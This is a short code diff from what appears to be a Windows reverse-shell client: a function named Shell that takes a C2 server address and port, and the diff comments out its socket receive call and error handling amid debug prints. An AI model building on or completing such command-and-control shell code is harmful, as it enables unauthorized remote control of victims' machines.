@@ -101,8 +101,7 @@ void Shell(char* C2Server, int C2Port)
 			std::cout << "[DBG] 8\n";
 			memset(RecvData, 0, sizeof(RecvData));
 			
-			// here waits after first data portion is received (after 1st input int socket)
-			int RecvCode = recv(tcpsock, RecvData, 1024, 0);
+			/*int RecvCode = recv(tcpsock, RecvData, 1024, 0);
 			
 			std::cout << "[DBG] 9\n";
 			if (RecvCode <= 0){
@@ -115,7 +114,7 @@ void Shell(char* C2Server, int C2Port)
 				closesocket(tcpsock);
 				WSACleanup();
 				return;
-			}
+			}*/
 		}
 	}
 }
